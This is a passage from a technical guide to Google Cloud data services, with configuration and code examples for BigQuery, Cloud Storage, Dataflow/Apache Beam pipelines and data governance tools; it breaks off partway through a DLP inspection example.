# GCP Data Services — Architecture, Implementation, and Security

## Table of Contents

1. [GCP Data Architecture Overview](#1-gcp-data-architecture-overview)
2. [BigQuery Deep Dive](#2-bigquery-deep-dive)
3. [Cloud Storage](#3-cloud-storage)
4. [Dataflow and Apache Beam](#4-dataflow-and-apache-beam)
5. [Data Governance](#5-data-governance)
6. [Streaming Architecture](#6-streaming-architecture)
7. [Security Architecture](#7-security-architecture)
8. [Security Assessment](#8-security-assessment)
9. [Monitoring and Compliance](#9-monitoring-and-compliance)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. GCP Data Architecture Overview

### BigQuery-Centric Analytics Platform

GCP's modern data architecture places BigQuery at the center of the analytics ecosystem. Unlike traditional data warehouse architectures that require complex ETL pipelines before analysis, BigQuery functions simultaneously as a data warehouse, a data lake query engine (via external tables and BigLake), and a machine learning platform (BigQuery ML).

The reference architecture follows a medallion pattern adapted for GCP:

```
Raw Zone (Cloud Storage)
    → Bronze Layer (raw ingestion, Avro/Parquet/JSON)
        → Silver Layer (cleaned, deduplicated, typed — BigQuery)
            → Gold Layer (aggregated, business-ready — BigQuery + BI Engine)
```

### Cloud Storage as Data Lake

Cloud Storage serves as the foundational data lake layer. Its role extends beyond simple object storage:

- **Landing zone** for raw data ingestion from external systems
- **Staging area** for ETL/ELT intermediate results
- **Long-term archive** for compliance and historical analysis
- **External table backing store** for BigQuery federated queries
- **Model artifact storage** for Vertex AI training pipelines
- **Dataflow temp/staging location** for pipeline execution

### Dataflow (Apache Beam)

Dataflow provides serverless, auto-scaling data processing for both batch and streaming workloads. It implements the Apache Beam programming model, enabling portable pipelines that can run on multiple runners. Key differentiators:

- **Streaming Engine** offloads windowing state from worker VMs to a managed service
- **Shuffle Service** handles GroupByKey operations server-side for batch jobs
- **FlexRS** (Flexible Resource Scheduling) uses preemptible VMs for cost optimization
- **Dynamic Work Rebalancing** prevents hot keys from creating stragglers

### Dataproc (Managed Spark/Hadoop)

Dataproc provides managed Apache Spark, Hadoop, Presto, and Flink clusters with:

- 90-second cluster creation time
- Per-second billing with autoscaling policies
- Integration with Cloud Storage as HDFS replacement (gs:// connector)
- Component Gateway for web UIs (Spark History, Jupyter, Zeppelin)
- Serverless Spark for ad-hoc batch jobs without cluster management
- Metastore service for persistent Hive-compatible metadata

### Pub/Sub (Messaging)

Pub/Sub delivers global, at-least-once messaging with:

- Topic-subscription fan-out model
- Exactly-once delivery (with Dataflow consumer deduplication)
- Ordering keys for per-key FIFO guarantees
- Dead-letter topics for poison message handling
- Schema enforcement (Avro, Protocol Buffers)
- Message retention up to 31 days

### Composer (Managed Airflow)

Cloud Composer provides managed Apache Airflow for workflow orchestration:

- Composer 2 uses GKE Autopilot for worker scaling
- DAG serialization and parsing performance improvements
- Built-in operators for BigQuery, Dataflow, Dataproc, GCS
- Private IP configurations for network isolation
- Triggerer for deferrable operators (async sensor patterns)

### Vertex AI

Vertex AI unifies GCP's ML platform:

- **Feature Store** for online/offline feature serving
- **Pipelines** (Kubeflow or TFX-based) for ML workflow orchestration
- **Model Registry** with versioning and lineage
- **Prediction** endpoints with auto-scaling
- **Workbench** for managed Jupyter notebooks
- **Vector Search** for similarity/embedding retrieval

### Reference Architecture: Enterprise Analytics Platform

```
┌─────────────────────────────────────────────────────────────────────┐
│                        Organization                                   │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │  Ingestion VPC   │  │  Processing VPC  │  │  Analytics VPC   │  │
│  │                  │  │                  │  │                  │  │
│  │  Pub/Sub         │  │  Dataflow        │  │  BigQuery        │  │
│  │  Cloud Functions │  │  Dataproc        │  │  Looker          │  │
│  │  Transfer Svc    │  │  Composer        │  │  BI Engine       │  │
│  │                  │  │                  │  │  Vertex AI       │  │
│  └──────┬───────────┘  └────────┬─────────┘  └────────┬─────────┘  │
│         │                       │                      │            │
│         └───────────────────────┴──────────────────────┘            │
│                              │                                       │
│                    ┌─────────┴──────────┐                           │
│                    │   Cloud Storage    │                            │
│                    │   (Data Lake)      │                            │
│                    └────────────────────┘                            │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │              VPC Service Controls Perimeter                     │ │
│  └────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

### Terraform: Foundation Setup

```hcl
# Project and API enablement for data platform
resource "google_project_service" "data_services" {
  for_each = toset([
    "bigquery.googleapis.com",
    "storage.googleapis.com",
    "dataflow.googleapis.com",
    "dataproc.googleapis.com",
    "pubsub.googleapis.com",
    "composer.googleapis.com",
    "datacatalog.googleapis.com",
    "dlp.googleapis.com",
    "dataplex.googleapis.com",
  ])

  project = var.project_id
  service = each.key

  disable_dependent_services = false
  disable_on_destroy         = false
}

# Data platform service account with least privilege
resource "google_service_account" "data_platform" {
  account_id   = "data-platform-sa"
  display_name = "Data Platform Service Account"
  project      = var.project_id
}

resource "google_project_iam_member" "data_platform_roles" {
  for_each = toset([
    "roles/bigquery.dataEditor",
    "roles/bigquery.jobUser",
    "roles/storage.objectAdmin",
    "roles/dataflow.worker",
    "roles/pubsub.subscriber",
  ])

  project = var.project_id
  role    = each.key
  member  = "serviceAccount:${google_service_account.data_platform.email}"
}
```

---

## 2. BigQuery Deep Dive

### Architecture Internals

BigQuery's architecture separates compute from storage entirely, built on four foundational Google technologies:

**Dremel** — The execution engine that uses a multi-level serving tree to process queries:
- Root server receives query, plans execution
- Intermediate servers coordinate distribution
- Leaf servers (slots) read data and execute operations
- Columnar execution with vectorized processing
- Each slot processes a partition/shard independently

**Colossus** — Google's distributed file system storing BigQuery data:
- Columnar format (Capacitor) with per-column compression
- Automatic replication and encryption at rest
- Dictionary encoding, run-length encoding, delta encoding per column type
- Erasure coding for storage efficiency

**Jupiter** — Petabit-scale network fabric:
- Enables shuffle operations between slots at 1 Pb/s bisection bandwidth
- Separates storage from compute without network bottleneck
- Supports reading terabytes from Colossus in seconds

**Borg** — Cluster management (predecessor to Kubernetes):
- Allocates compute resources (slots) dynamically
- Handles slot scheduling, preemption, and fault tolerance
- Enables multi-tenancy with resource isolation

### Slots and Reservations

Slots are BigQuery's unit of computational capacity. Each slot provides approximately 0.5 CPU and some RAM.

**On-demand pricing:**
- Default 2000 slots per project
- Billed per TB scanned ($6.25/TB in US multi-region)
- Automatic slot allocation

**Capacity reservations (flat-rate):**

```hcl
resource "google_bigquery_reservation" "production" {
  name              = "production-reservation"
  location          = "US"
  slot_capacity     = 500
  edition           = "ENTERPRISE"
  ignore_idle_slots = false
}

resource "google_bigquery_reservation_assignment" "prod_assignment" {
  assignee    = "projects/${var.project_id}"
  job_type    = "QUERY"
  reservation = google_bigquery_reservation.production.name
}
```

**Autoscaling (Enterprise/Enterprise Plus editions):**
- Baseline slots always available
- Autoscale slots added on demand up to configured max
- Per-second billing for autoscale slots only when used

### Partitioning

Partitioning divides a table into segments for query optimization and cost control.

**Ingestion-time partitioning:**
```sql
CREATE TABLE `project.dataset.events`
(
  event_id STRING,
  event_data JSON,
  user_id STRING
)
PARTITION BY _PARTITIONDATE
OPTIONS (
  partition_expiration_days = 365,
  require_partition_filter = true
);
```

**Column-based partitioning (DATE/TIMESTAMP/DATETIME):**
```sql
CREATE TABLE `project.dataset.transactions`
(
  transaction_id STRING,
  amount NUMERIC,
  created_at TIMESTAMP,
  region STRING
)
PARTITION BY DATE(created_at)
CLUSTER BY region, amount
OPTIONS (
  partition_expiration_days = 730,
  require_partition_filter = true
);
```

**Integer range partitioning:**
```sql
CREATE TABLE `project.dataset.user_scores`
(
  user_id INT64,
  score INT64,
  category STRING
)
PARTITION BY RANGE_BUCKET(score, GENERATE_ARRAY(0, 1000000, 10000));
```

### Clustering

Clustering sorts data within partitions by up to four columns, enabling block pruning:

- Most effective for high-cardinality columns used in filters
- Column order matters: first column = primary sort
- Automatic re-clustering maintains optimal layout
- No additional storage cost

```sql
CREATE TABLE `project.dataset.web_analytics`
(
  session_id STRING,
  user_id STRING,
  page_url STRING,
  event_time TIMESTAMP,
  country STRING,
  device_type STRING
)
PARTITION BY DATE(event_time)
CLUSTER BY country, user_id, page_url;
```

### Materialized Views

```sql
CREATE MATERIALIZED VIEW `project.dataset.daily_revenue_mv`
OPTIONS (
  enable_refresh = true,
  refresh_interval_minutes = 30,
  max_staleness = INTERVAL "4:0:0" HOUR TO SECOND
)
AS
SELECT
  DATE(order_time) AS order_date,
  region,
  product_category,
  COUNT(*) AS order_count,
  SUM(revenue) AS total_revenue,
  AVG(revenue) AS avg_revenue
FROM `project.dataset.orders`
GROUP BY order_date, region, product_category;
```

Materialized views provide:
- Automatic query rewriting (optimizer uses MV transparently)
- Incremental refresh (only processes new/changed data)
- Smart tuning suggestions via INFORMATION_SCHEMA

### BI Engine

BI Engine provides in-memory analysis acceleration:

```hcl
resource "google_bigquery_bi_reservation" "analytics" {
  location   = "US"
  size       = "10737418240" # 10 GB
  project    = var.project_id
}
```

- Vectorized in-memory query execution
- Automatic table selection based on access patterns
- Sub-second response for dashboards and exploration
- Works with Looker, Looker Studio, and JDBC/ODBC connections

### BigQuery ML

```sql
-- Train a classification model
CREATE OR REPLACE MODEL `project.dataset.churn_model`
OPTIONS (
  model_type = 'LOGISTIC_REG',
  input_label_cols = ['churned'],
  auto_class_weights = TRUE,
  l2_reg = 0.01,
  max_iterations = 20,
  data_split_method = 'AUTO_SPLIT'
) AS
SELECT
  tenure_months,
  monthly_charges,
  total_charges,
  contract_type,
  payment_method,
  churned
FROM `project.dataset.customer_features`
WHERE signup_date < '2024-01-01';

-- Evaluate
SELECT * FROM ML.EVALUATE(MODEL `project.dataset.churn_model`);

-- Predict
SELECT
  customer_id,
  predicted_churned,
  predicted_churned_probs
FROM ML.PREDICT(
  MODEL `project.dataset.churn_model`,
  (SELECT * FROM `project.dataset.customer_features`
   WHERE signup_date >= '2024-01-01')
);

-- Export to Vertex AI for online serving
ALTER MODEL `project.dataset.churn_model`
SET OPTIONS (vertex_ai_model_id = 'churn_predictor_v1');
```

### BigQuery Omni (Multi-Cloud)

BigQuery Omni enables querying data in AWS S3 or Azure Blob Storage without data movement:

```sql
-- Create external connection to AWS
CREATE EXTERNAL TABLE `project.dataset.aws_logs`
WITH CONNECTION `projects/my-project/locations/aws-us-east-1/connections/s3-conn`
OPTIONS (
  format = 'PARQUET',
  uris = ['s3://my-bucket/logs/*.parquet']
);

-- Query across clouds
SELECT
  gcp.user_id,
  gcp.event_type,
  aws.purchase_amount
FROM `project.dataset.gcp_events` gcp
JOIN `project.dataset.aws_logs` aws
  ON gcp.user_id = aws.user_id
WHERE gcp.event_date = '2024-06-15';
```

### Streaming Inserts vs Batch Loads

**Streaming inserts** (legacy `tabledata.insertAll`):
- Near-real-time availability (seconds)
- Per-row pricing ($0.05/GB inserted)
- 1 MB max row size, 10 MB max request size
- Best-effort deduplication with insertId

**Storage Write API** (recommended replacement):
- Exactly-once semantics with committed streams
- 2x cheaper than legacy streaming
- Supports pending streams for atomic batch commits
- Higher throughput (up to 3 GB/s per project)

```python
from google.cloud import bigquery_storage_v1
from google.cloud.bigquery_storage_v1 import types, writer
from google.protobuf import descriptor_pb2
import events_pb2  # generated from .proto

client = bigquery_storage_v1.BigQueryWriteClient()
parent = client.table_path(project_id, "dataset", "events")

# Create a committed stream for exactly-once writes
write_stream = types.WriteStream(type_=types.WriteStream.Type.COMMITTED)
write_stream = client.create_write_stream(
    parent=parent, write_stream=write_stream
)

request_template = types.AppendRowsRequest(
    write_stream=write_stream.name,
)

# Proto serialization for type-safe writes
proto_schema = types.ProtoSchema()
proto_descriptor = descriptor_pb2.DescriptorProto()
events_pb2.EventRow.DESCRIPTOR.CopyToProto(proto_descriptor)
proto_schema.proto_descriptor = proto_descriptor

proto_data = types.AppendRowsRequest.ProtoData(
    writer_schema=proto_schema,
)

# Append rows
proto_rows = types.ProtoRows()
row = events_pb2.EventRow()
row.event_id = "evt-001"
row.timestamp = 1718400000
row.user_id = "usr-123"
proto_rows.serialized_rows.append(row.SerializeToString())

proto_data.rows = proto_rows
request_template.proto_rows = proto_data

response = client.append_rows(iter([request_template]))
```

**Batch loads** (free for standard loads):
- No charge for load jobs
- Supports CSV, JSON, Avro, Parquet, ORC
- Atomic (full table or nothing)
- Up to 15 TB per load job

```bash
# Load Parquet from GCS
bq load \
  --source_format=PARQUET \
  --time_partitioning_field=event_date \
  --clustering_fields=region,user_id \
  --autodetect \
  project:dataset.events \
  gs://data-lake/events/2024/*.parquet
```

---

## 3. Cloud Storage

### Buckets and Objects

Cloud Storage organizes data in a flat namespace within buckets:

- **Bucket** — globally unique name, single region/dual-region/multi-region location, uniform or fine-grained IAM
- **Object** — immutable (versioned), identified by bucket + name (path), up to 5 TiB per object
- **Metadata** — system-defined (Content-Type, CRC32C, MD5) and custom key-value pairs

```bash
# Create a dual-region bucket with uniform bucket-level access
gcloud storage buckets create gs://enterprise-data-lake-prod \
  --location=US-CENTRAL1+US-EAST1 \
  --uniform-bucket-level-access \
  --default-storage-class=STANDARD \
  --public-access-prevention=enforced \
  --soft-delete-duration=7d
```

### Storage Classes

| Class | Min Duration | Access Cost | Use Case |
|-------|-------------|-------------|----------|
| Standard | None | Low | Hot data, frequent access |
| Nearline | 30 days | Medium | Monthly access patterns |
| Coldline | 90 days | High | Quarterly access |
| Archive | 365 days | Highest | Compliance, DR |

All classes share identical:
- Throughput and latency for first byte
- APIs and tools
- Availability SLA within region type
- Encryption and access control

### Lifecycle Management

```json
{
  "lifecycle": {
    "rule": [
      {
        "action": {"type": "SetStorageClass", "storageClass": "NEARLINE"},
        "condition": {
          "age": 30,
          "matchesStorageClass": ["STANDARD"],
          "matchesPrefix": ["logs/", "staging/"]
        }
      },
      {
        "action": {"type": "SetStorageClass", "storageClass": "COLDLINE"},
        "condition": {
          "age": 90,
          "matchesStorageClass": ["NEARLINE"]
        }
      },
      {
        "action": {"type": "SetStorageClass", "storageClass": "ARCHIVE"},
        "condition": {
          "age": 365,
          "matchesStorageClass": ["COLDLINE"]
        }
      },
      {
        "action": {"type": "Delete"},
        "condition": {
          "age": 2555,
          "matchesStorageClass": ["ARCHIVE"]
        }
      },
      {
        "action": {"type": "Delete"},
        "condition": {
          "isLive": false,
          "numNewerVersions": 3
        }
      }
    ]
  }
}
```

### Retention Policies and Bucket Lock

```hcl
resource "google_storage_bucket" "compliance_bucket" {
  name          = "financial-records-archive"
  location      = "US"
  storage_class = "COLDLINE"

  uniform_bucket_level_access = true
  public_access_prevention    = "enforced"

  retention_policy {
    is_locked        = true  # IRREVERSIBLE — cannot shorten after lock
    retention_period = 220752000  # 7 years in seconds
  }

  versioning {
    enabled = true
  }

  soft_delete_policy {
    retention_duration_seconds = 604800  # 7 days
  }

  logging {
    log_bucket        = google_storage_bucket.access_logs.name
    log_object_prefix = "financial-records/"
  }
}
```

**Bucket Lock** makes the retention policy permanent and immutable. Once locked:
- Retention period cannot be reduced (can be increased)
- Bucket cannot be deleted until all objects satisfy retention
- Provides WORM (Write Once Read Many) compliance for SEC 17a-4, CFTC, FINRA

### Object Versioning

```bash
# Enable versioning
gcloud storage buckets update gs://enterprise-data-lake-prod \
  --versioning

# List object versions
gcloud storage ls -la gs://enterprise-data-lake-prod/data/customers.parquet

# Restore a specific version
gcloud storage cp \
  gs://enterprise-data-lake-prod/data/customers.parquet#1718400000000000 \
  gs://enterprise-data-lake-prod/data/customers.parquet
```

### Turbo Replication

For dual-region buckets, Turbo Replication guarantees RPO (Recovery Point Objective) of 15 minutes by replicating new objects to both regions within that window. Standard replication provides no RPO guarantee (typically minutes, but not SLA-backed).

```hcl
resource "google_storage_bucket" "turbo_replicated" {
  name     = "critical-analytics-data"
  location = "US-CENTRAL1+US-EAST1"

  custom_placement_config {
    data_locations = ["US-CENTRAL1", "US-EAST1"]
  }

  rpo = "ASYNC_TURBO"  # 15-minute RPO guarantee

  uniform_bucket_level_access = true
}
```

### Signed URLs

Signed URLs grant time-limited access without requiring IAM permissions on the requesting identity:

```python
from google.cloud import storage
from datetime import timedelta

def generate_signed_url(
    bucket_name: str,
    blob_name: str,
    expiration_minutes: int = 15,
) -> str:
    """Generate a V4 signed URL for download.

    The signing service account must have:
    - storage.objects.get on the target object
    - iam.serviceAccounts.signBlob on itself (or use HMAC)
    """
    client = storage.Client()
    bucket = client.bucket(bucket_name)
    blob = bucket.blob(blob_name)

    url = blob.generate_signed_url(
        version="v4",
        expiration=timedelta(minutes=expiration_minutes),
        method="GET",
        # Content-Type validation prevents URL reuse for uploads
        response_type="application/octet-stream",
    )
    return url


def generate_upload_signed_url(
    bucket_name: str,
    blob_name: str,
    content_type: str = "application/octet-stream",
    max_size_bytes: int = 100_000_000,  # 100 MB
) -> str:
    """Generate a V4 signed URL for upload with size restriction."""
    client = storage.Client()
    bucket = client.bucket(bucket_name)
    blob = bucket.blob(blob_name)

    url = blob.generate_signed_url(
        version="v4",
        expiration=timedelta(hours=1),
        method="PUT",
        content_type=content_type,
        headers={
            "x-goog-content-length-range": f"0,{max_size_bytes}",
        },
    )
    return url
```

### HMAC Keys

HMAC keys provide S3-compatible authentication for tools that use the XML API:

```bash
# Create HMAC key for a service account
gcloud storage hmac create \
  data-migration-sa@project-id.iam.gserviceaccount.com

# List active HMAC keys (audit periodically)
gcloud storage hmac list --filter="state=ACTIVE"

# Deactivate compromised key
gcloud storage hmac update GOOG1EXAMPLE_ACCESS_KEY_ID --deactivate
```

Security considerations:
- HMAC keys bypass IAM audit logging in some configurations
- Rotate every 90 days minimum
- Monitor with `storage.hmacKeys.create` audit log entries
- Prefer OAuth 2.0 / service account keys over HMAC where possible

### Autoclass

Autoclass automatically transitions objects between storage classes based on access patterns:

```hcl
resource "google_storage_bucket" "autoclass_lake" {
  name     = "ml-training-data-lake"
  location = "US-CENTRAL1"

  autoclass {
    enabled                = true
    terminal_storage_class = "ARCHIVE"  # Lowest tier objects can reach
  }

  uniform_bucket_level_access = true
}
```

Autoclass is ideal when access patterns are unpredictable or varied across objects within the same bucket.

---

## 4. Dataflow and Apache Beam

### Apache Beam Programming Model

Apache Beam provides a unified programming model for batch and streaming:

**PCollection** — An immutable, distributed dataset. Can be bounded (batch) or unbounded (streaming).

**PTransform** — A processing operation that transforms one or more PCollections into output PCollections.

**Pipeline** — The top-level container connecting data sources, transforms, and sinks.

### Core Transforms

```python
import apache_beam as beam
from apache_beam.options.pipeline_options import PipelineOptions, GoogleCloudOptions
from apache_beam.io.gcp.bigquery import ReadFromBigQuery, WriteToBigQuery
import json


def run_batch_pipeline():
    """ETL pipeline: GCS JSON → transform → BigQuery."""
    options = PipelineOptions(
        runner='DataflowRunner',
        project='my-project',
        region='us-central1',
        temp_location='gs://dataflow-temp-bucket/tmp',
        staging_location='gs://dataflow-temp-bucket/staging',
        machine_type='n2-standard-4',
        max_num_workers=20,
        disk_size_gb=50,
        save_main_session=True,
    )

    with beam.Pipeline(options=options) as p:
        raw_events = (
            p
            | 'ReadFromGCS' >> beam.io.ReadFromText(
                'gs://data-lake/events/2024-06-*.json'
            )
            | 'ParseJSON' >> beam.Map(json.loads)
        )

        # ParDo: element-wise processing with side outputs
        valid_events, invalid_events = (
            raw_events
            | 'ValidateAndRoute' >> beam.ParDo(
                ValidateEventFn()
            ).with_outputs('invalid', main='valid')
        )

        # GroupByKey: aggregate by user
        user_sessions = (
            valid_events
            | 'KeyByUser' >> beam.Map(lambda e: (e['user_id'], e))
            | 'GroupByUser' >> beam.GroupByKey()
            | 'BuildSessions' >> beam.ParDo(SessionBuilderFn())
        )

        # Write valid data to BigQuery
        user_sessions | 'WriteToBQ' >> WriteToBigQuery(
            table='project:dataset.user_sessions',
            schema='SCHEMA_AUTODETECT',
            write_disposition=beam.io.BigQueryDisposition.WRITE_APPEND,
            create_disposition=beam.io.BigQueryDisposition.CREATE_IF_NEEDED,
            method=beam.io.WriteToBigQuery.Method.FILE_LOADS,
        )

        # Write invalid records to dead-letter table
        invalid_events | 'WriteDeadLetter' >> WriteToBigQuery(
            table='project:dataset.dead_letter_events',
            schema='SCHEMA_AUTODETECT',
            write_disposition=beam.io.BigQueryDisposition.WRITE_APPEND,
        )


class ValidateEventFn(beam.DoFn):
    """Validate events, routing invalid to side output."""

    def process(self, element):
        required_fields = ['event_id', 'user_id', 'timestamp', 'event_type']
        missing = [f for f in required_fields if f not in element]

        if missing:
            element['_validation_error'] = f"Missing: {missing}"
            yield beam.pvalue.TaggedOutput('invalid', element)
        elif not isinstance(element.get('timestamp'), (int, float)):
            element['_validation_error'] = "Invalid timestamp type"
            yield beam.pvalue.TaggedOutput('invalid', element)
        else:
            yield element


class SessionBuilderFn(beam.DoFn):
    """Build user sessions from grouped events."""

    SESSION_GAP_SECONDS = 1800  # 30 minutes

    def process(self, element):
        user_id, events = element
        sorted_events = sorted(events, key=lambda e: e['timestamp'])

        sessions = []
        current_session = [sorted_events[0]]

        for event in sorted_events[1:]:
            gap = event['timestamp'] - current_session[-1]['timestamp']
            if gap > self.SESSION_GAP_SECONDS:
                sessions.append(self._finalize_session(user_id, current_session))
                current_session = [event]
            else:
                current_session.append(event)

        sessions.append(self._finalize_session(user_id, current_session))

        for session in sessions:
            yield session

    def _finalize_session(self, user_id, events):
        return {
            'user_id': user_id,
            'session_start': events[0]['timestamp'],
            'session_end': events[-1]['timestamp'],
            'event_count': len(events),
            'duration_seconds': events[-1]['timestamp'] - events[0]['timestamp'],
            'event_types': list(set(e['event_type'] for e in events)),
        }
```

### Windowing and Triggers

```python
import apache_beam as beam
from apache_beam import window
from apache_beam.transforms.trigger import (
    AfterWatermark,
    AfterProcessingTime,
    AccumulationMode,
    AfterCount,
    Repeatedly,
)


def streaming_pipeline():
    """Streaming pipeline with windowing and triggers."""
    options = PipelineOptions(
        runner='DataflowRunner',
        project='my-project',
        region='us-central1',
        streaming=True,
        enable_streaming_engine=True,
        temp_location='gs://dataflow-temp/tmp',
        num_workers=5,
        max_num_workers=50,
        autoscaling_algorithm='THROUGHPUT_BASED',
    )

    with beam.Pipeline(options=options) as p:
        events = (
            p
            | 'ReadPubSub' >> beam.io.ReadFromPubSub(
                topic='projects/my-project/topics/events',
                timestamp_attribute='event_timestamp',
            )
            | 'ParseJSON' >> beam.Map(json.loads)
        )

        # Fixed windows with early/late firing
        windowed_counts = (
            events
            | 'KeyByRegion' >> beam.Map(lambda e: (e['region'], 1))
            | 'FixedWindow' >> beam.WindowInto(
                window.FixedWindows(300),  # 5-minute windows
                trigger=AfterWatermark(
                    early=AfterProcessingTime(60),  # Fire every minute
                    late=AfterCount(1),  # Fire on each late element
                ),
                accumulation_mode=AccumulationMode.ACCUMULATING,
                allowed_lateness=beam.utils.timestamp.Duration(seconds=3600),
            )
            | 'CountPerRegion' >> beam.CombinePerKey(sum)
        )

        # Session windows (gap-based)
        user_sessions = (
            events
            | 'KeyByUser' >> beam.Map(lambda e: (e['user_id'], e))
            | 'SessionWindow' >> beam.WindowInto(
                window.Sessions(1800),  # 30-minute gap
                trigger=AfterWatermark(
                    early=AfterProcessingTime(300),
                ),
                accumulation_mode=AccumulationMode.DISCARDING,
            )
            | 'AggregateSession' >> beam.CombinePerKey(SessionCombineFn())
        )
```

### Side Inputs

```python
class EnrichWithMetadata(beam.DoFn):
    """Enrich events with slowly-changing dimension data via side input."""

    def process(self, element, user_metadata):
        user_id = element['user_id']
        metadata = user_metadata.get(user_id, {})
        element['user_segment'] = metadata.get('segment', 'unknown')
        element['user_country'] = metadata.get('country', 'unknown')
        yield element


# In pipeline
metadata_view = (
    p
    | 'ReadMetadata' >> ReadFromBigQuery(
        query='SELECT user_id, segment, country FROM `project.dataset.users`',
        use_standard_sql=True,
    )
    | 'MetadataToDict' >> beam.Map(lambda r: (r['user_id'], r))
    | 'AsDict' >> beam.combiners.ToDict()
)

enriched = (
    events
    | 'Enrich' >> beam.ParDo(
        EnrichWithMetadata(),
        user_metadata=beam.pvalue.AsSingleton(metadata_view),
    )
)
```

### Dataflow Runner Specifics

**Autoscaling:**
- `THROUGHPUT_BASED` (default) — scales based on backlog and throughput
- Streaming: scales workers 1→max based on CPU utilization and backlog
- Batch: scales based on remaining work and parallelism

**Streaming Engine:**
- Offloads windowing state from worker memory to managed backend
- Reduces worker memory requirements by 50-80%
- Enables faster autoscaling (state does not move with workers)

**Shuffle Service (batch):**
- Offloads GroupByKey data from local disk to managed service
- Eliminates disk-bound bottlenecks for large shuffles
- No local SSD requirements

### Flex Templates

Flex Templates package pipelines as Docker containers for parameterized execution:

```dockerfile
FROM gcr.io/dataflow-templates-base/python311-template-launcher-base

ENV FLEX_TEMPLATE_PYTHON_PY_FILE="/template/pipeline.py"
ENV FLEX_TEMPLATE_PYTHON_REQUIREMENTS_FILE="/template/requirements.txt"

COPY pipeline.py /template/
COPY requirements.txt /template/

RUN pip install --no-cache-dir -r /template/requirements.txt
```

```bash
# Build and register Flex Template
gcloud dataflow flex-template build \
  gs://dataflow-templates/event-processor.json \
  --image-gcr-path=gcr.io/my-project/event-pipeline:latest \
  --sdk-language=PYTHON \
  --flex-template-base-image=PYTHON3 \
  --py-path=pipeline.py \
  --env FLEX_TEMPLATE_PYTHON_PY_FILE=pipeline.py

# Launch from template
gcloud dataflow flex-template run "event-processing-$(date +%Y%m%d)" \
  --template-file-gcs-location=gs://dataflow-templates/event-processor.json \
  --region=us-central1 \
  --parameters input_topic=projects/my-project/topics/events \
  --parameters output_table=project:dataset.processed_events \
  --parameters max_num_workers=50 \
  --service-account-email=dataflow-sa@my-project.iam.gserviceaccount.com \
  --network=data-processing-vpc \
  --subnetwork=regions/us-central1/subnetworks/dataflow-subnet \
  --disable-public-ips
```

---

## 5. Data Governance

### Data Catalog

Data Catalog provides a centralized metadata management service with:

- Automatic discovery and registration of BigQuery, Pub/Sub, Dataproc Metastore assets
- Custom entry groups for external systems
- Tag templates for business metadata
- Policy tags for column-level security
- Search across all data assets with fine-grained IAM

```python
from google.cloud import datacatalog_v1

client = datacatalog_v1.DataCatalogClient()

# Create a tag template for data classification
tag_template = datacatalog_v1.TagTemplate()
tag_template.display_name = "Data Classification"

# Classification level field
field = datacatalog_v1.TagTemplateField()
field.display_name = "Classification Level"
field.type_.enum_type.allowed_values.append(
    datacatalog_v1.FieldType.EnumType.EnumValue(display_name="PUBLIC")
)
field.type_.enum_type.allowed_values.append(
    datacatalog_v1.FieldType.EnumType.EnumValue(display_name="INTERNAL")
)
field.type_.enum_type.allowed_values.append(
    datacatalog_v1.FieldType.EnumType.EnumValue(display_name="CONFIDENTIAL")
)
field.type_.enum_type.allowed_values.append(
    datacatalog_v1.FieldType.EnumType.EnumValue(display_name="RESTRICTED")
)
tag_template.fields["classification_level"] = field

# Data owner field
owner_field = datacatalog_v1.TagTemplateField()
owner_field.display_name = "Data Owner"
owner_field.type_.primitive_type = datacatalog_v1.FieldType.PrimitiveType.STRING
owner_field.is_required = True
tag_template.fields["data_owner"] = owner_field

# Retention requirement field
retention_field = datacatalog_v1.TagTemplateField()
retention_field.display_name = "Retention Period (Days)"
retention_field.type_.primitive_type = datacatalog_v1.FieldType.PrimitiveType.DOUBLE
tag_template.fields["retention_days"] = retention_field

created = client.create_tag_template(
    parent="projects/my-project/locations/us-central1",
    tag_template_id="data_classification",
    tag_template=tag_template,
)
```

### Policy Tags (Column-Level Security)

```hcl
resource "google_data_catalog_taxonomy" "pii_taxonomy" {
  provider     = google-beta
  project      = var.project_id
  region       = "us"
  display_name = "PII Classification"
  description  = "Taxonomy for PII data access control"

  activated_policy_types = ["FINE_GRAINED_ACCESS_CONTROL"]
}

resource "google_data_catalog_policy_tag" "high_sensitivity" {
  provider     = google-beta
  taxonomy     = google_data_catalog_taxonomy.pii_taxonomy.id
  display_name = "High Sensitivity PII"
  description  = "SSN, credit cards, health records"
}

resource "google_data_catalog_policy_tag" "medium_sensitivity" {
  provider     = google-beta
  taxonomy     = google_data_catalog_taxonomy.pii_taxonomy.id
  display_name = "Medium Sensitivity PII"
  description  = "Email, phone, address"
}

# Bind IAM to policy tag
resource "google_data_catalog_policy_tag_iam_binding" "high_pii_readers" {
  provider   = google-beta
  policy_tag = google_data_catalog_policy_tag.high_sensitivity.name
  role       = "roles/datacatalog.categoryFineGrainedReader"
  members = [
    "group:pii-analysts@company.com",
  ]
}
```

Apply to BigQuery schema:
```sql
ALTER TABLE `project.dataset.customers`
ALTER COLUMN ssn SET OPTIONS (
  policy_tags = 'projects/my-project/locations/us/taxonomies/123/policyTags/456'
);

ALTER TABLE `project.dataset.customers`
ALTER COLUMN email SET OPTIONS (
  policy_tags = 'projects/my-project/locations/us/taxonomies/123/policyTags/789'
);
```

### DLP API (Cloud Data Loss Prevention)

```python
from google.cloud import dlp_v2

dlp_client = dlp_v2.DlpServiceClient()
project = "my-project"


def inspect_bigquery_table(
    dataset_id: str,
    table_id: str,
    info_types: list[str],
) -> dict:
    """Run DLP inspection on a BigQuery table."""
    inspect_config = {
        "info_types": [{"name": it} for it in info_types],
        "min_likelihood": dlp_v2.Likelihood.LIKELY,
        "include_quote": False,  # Do not store matching content
        "limits": {
            "max_findings_per_request": 1000,
            "max_findings_per_item": 100,
        },
        "custom_info_types": [
            {
                "info_type": {"name": "INTERNAL_EMPLOYEE_ID"},
                "regex": {"pattern": r"EMP-[A-Z]{2}\d{6}"},
                "likelihood": dlp_v2.Likelihood.VERY_LIKELY,
            }
        ],
    }

    storage_config = {
        "big_query_options": {
            "table_reference": {
                "project_id": project,
                "dataset_id": dataset_id,
                "table_id": table_id,
            },
            "rows_limit": 10000,
            "sample_method": dlp_v2.BigQueryOptions.SampleMethod.RANDOM_START,
        }
    }

    actions = [
        {
            "save_findings": {
                "output_config": {
                    "table": {
                        "project_id": project,
                        "dataset_id": "dlp_results",
                        "table_id": f"findings_{table_id}",
                    }
